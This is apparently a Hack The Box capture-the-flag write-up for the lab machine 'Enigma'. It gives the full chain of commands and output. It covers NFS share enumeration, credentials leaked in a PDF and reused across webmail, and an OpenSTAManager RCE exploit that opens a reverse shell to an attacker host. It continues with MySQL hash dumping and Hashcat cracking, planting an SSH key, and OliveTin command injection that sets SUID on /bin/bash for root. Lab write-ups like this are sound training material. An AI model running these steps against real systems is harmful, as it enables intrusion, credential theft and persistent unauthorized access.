# Enigma - Hack The Box Writeup

## Introduction
**Enigma** is an easy-difficulty Linux machine on Hack The Box. The initial foothold involves discovering an exposed Network File System (NFS) share containing an onboarding document with credentials for a company webmail account. Accessing Roundcube Webmail reveals internal correspondence and allows a credential-reuse pivot into another employee's mailbox, exposing administrative credentials for **OpenSTAManager 2.9.8**. Exploiting an authenticated Remote Code Execution flaw (CVE-2026-38751) in OpenSTAManager grants a reverse shell as `www-data`. 

Lateral movement is achieved by extracting MySQL database credentials from `config.include.php`, dumping user bcrypt password hashes from the `zz_users` table, and cracking the hash for user `haris` using Hashcat. Privilege escalation leverages an internal service running **OliveTin** in `/opt/OliveTin` configured with `authRequireGuestsToLogin: false`. This allows unauthenticated command injection via its API (CVE-2026-27626) to assign the SUID bit to `/bin/bash` and obtain a root shell to capture `root.txt`.

### Attack Summary Table
| Metric / Phase | Details |
| --- | --- |
| **Target IP** | `10.129.93.74` |
| **OS** | Linux |
| **Initial Access** | Exposed NFS Share -> PDF Credential Leak -> Webmail Pivot -> OpenSTAManager RCE (CVE-2026-38751) |
| **Lateral Movement** | `config.include.php` DB Credentials -> MySQL Hash Extraction -> Hashcat Cracking (`bestfriends`) -> `su haris` |
| **Privilege Escalation** | OliveTin Guest Auth Bypass (CVE-2026-27626) -> SUID `/bin/bash` -> Root Shell |

---

## Reconnaissance

### Port Scanning
A full TCP port scan was conducted to identify active services and listening ports:

```bash
sudo nmap 10.129.93.74 -n -Pn --min-rate 4000 -p- -oN fast_scan
```

```text
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
```

The scan reveals SSH, HTTP, standard email services (POP3, IMAP, and their SSL/TLS variants), RPCBind, and NFS on port 2049.

The hostname was appended to `/etc/hosts` for proper name resolution:

```bash
echo "10.129.93.74 enigma.htb" | sudo tee -a /etc/hosts
```

### NFS Enumeration & Document Discovery
Enumerating available NFS exports on the target using Nmap's `nfs-showmount` script identified an exposed directory:

```bash
nmap 10.129.93.74 -p 2049,111 --script=nfs-showmount
```

```text
PORT     STATE SERVICE
111/tcp  open  rpcbind
| nfs-showmount: 
|_  /srv/nfs/onboarding *
2049/tcp open  nfs
```

The remote share `/srv/nfs/onboarding` was mounted locally:

```bash
mkdir -p /tmp/nfs_target
sudo mount -t nfs 10.129.93.74:/srv/nfs/onboarding /tmp/nfs_target -o nolock
ls -la /tmp/nfs_target
```

```text
-rw-r--r-- 1 root root 42104 Mar  1  2024 New_Employee_Access.pdf
```

Copying and extracting text from `New_Employee_Access.pdf` revealed credentials provisioned for a new employee:

```text
Employee: Kevin Mitchell
Department: Operations
Provisioned by: IT Department
Date: 2024-03-01

Webmail Access
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!

Please change your password upon first login.
For support contact: it@enigma.htb
```

The webmail subdomain was mapped in `/etc/hosts`:

```bash
echo "10.129.93.74 mail001.enigma.htb" | sudo tee -a /etc/hosts
```

---

## Initial Access

### Webmail Enumeration & Credential Reuse Pivot
Navigating to `http://mail001.enigma.htb` presented a **Roundcube Webmail 1.6.16** login screen. Authenticating with `kevin:Enigma2024!` yielded access to Kevin's inbox. Reviewing incoming emails revealed a communication from Sarah in the Accounts department:

```text
Accounts Department  
Enigma Corp  
sarah@enigma.htb
```

Testing for credential reuse across known accounts, an authentication attempt for user `sarah` using the same password (`Enigma2024!`) succeeded. Inside Sarah's inbox was an email from `it@enigma.htb` containing credentials for an internal support platform:

```text
Hi Sarah,  
  
Apologies for the delay. I have provisioned your access. Please find the details below:  
  
URL: http://support_001.enigma.htb  
Username: admin  
Password: Ne3s4rtars78s

Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.
```

The support subdomain was appended to `/etc/hosts`:

```bash
echo "10.129.93.74 support_001.enigma.htb" | sudo tee -a /etc/hosts
```

### OpenSTAManager RCE (CVE-2026-38751)
Navigating to `http://support_001.enigma.htb` and logging in as `admin:Ne3s4rtars78s` opened the dashboard for **OpenSTAManager Version: 2.9.8 (R5ff39df9b)**.

Researching public exploits for this version revealed **CVE-2026-38751**, an authenticated Remote Code Execution vulnerability:
* **Exploit Reference:** `https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751`

Executing the exploit with the authenticated administrator credentials spawned a reverse shell:

```bash
./openstamanager-rce-exploit --url http://support_001.enigma.htb -U admin -P Ne3s4rtars78s --lhost 10.10.14.53 --lport 4444
```

This established an interactive reverse shell session under the context of the `www-data` user.

---

## Lateral Movement

### Database Credentials Extraction
Inspecting the application configuration directory revealed database parameters inside `config.include.php`:

```bash
cat /var/www/html/config.include.php
```

```php
// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

Using these credentials, the local MySQL database was queried:

```bash
mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e "SELECT username, password FROM zz_users;"
```

```text
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu |
| haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC |
+----------+--------------------------------------------------------------+
```

Checking `/etc/passwd` confirmed that `haris` is the only non-root user with an interactive shell:

```bash
cat /etc/passwd | grep -E "100[0-9]"
```

```text
haris:x:1000:1000:,,,:/home/haris:/bin/bash
kevin:x:1001:1001::/home/kevin:/usr/sbin/nologin
sarah:x:1002:1002::/home/sarah:/usr/sbin/nologin
it:x:1003:1003::/home/it:/usr/sbin/nologin
```

### Hash Cracking & Lateral Movement to Haris
The bcrypt hash (`$2y$10$`) for user `haris` was cracked using Hashcat mode `3200`:

```bash
hashcat -a 0 -m 3200 haris_hash /usr/share/wordlists/rockyou.txt
```

```text
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```

Direct SSH authentication with passwords was disabled, but switching users locally from `www-data` succeeded:

```bash
su - haris
# Password: bestfriends
```

For persistent access, an SSH public key was added to `/home/haris/.ssh/authorized_keys`:

```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... kali@kali" >> ~/.ssh/authorized_keys
```

---

## Privilege Escalation

### OliveTin Service Inspection
Local enumeration of `/opt` revealed a directory named `/opt/OliveTin`, which hosts an OliveTin web management daemon:

```bash
ls -la /opt/OliveTin
```

Reviewing `config.yaml` identified a dangerous configuration setting:

```yaml
authRequireGuestsToLogin: false
```

When `authRequireGuestsToLogin` is set to `false`, the OliveTin daemon permits unauthenticated callers to execute preconfigured management actions via its local API.

### Command Execution & Root Flag (CVE-2026-27626)
Researching vulnerabilities for this configuration revealed **CVE-2026-27626**, an unauthenticated command execution flaw:
* **Exploit Reference:** `https://github.com/0xh7ml/CVE-2026-27626-PoC`

The exploit was transferred to the target and executed to set the SUID bit on `/bin/bash`:

```bash
haris@enigma:/tmp$ python3 poc.py -u http://localhost --cmd "chmod u+s /bin/bash"
```

Spawning the privileged shell with preserved permissions yielded full root access:

```bash
haris@enigma:/tmp$ bash -p
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
3fb6bffcd959aa27df219ac8ddb75ac5
```
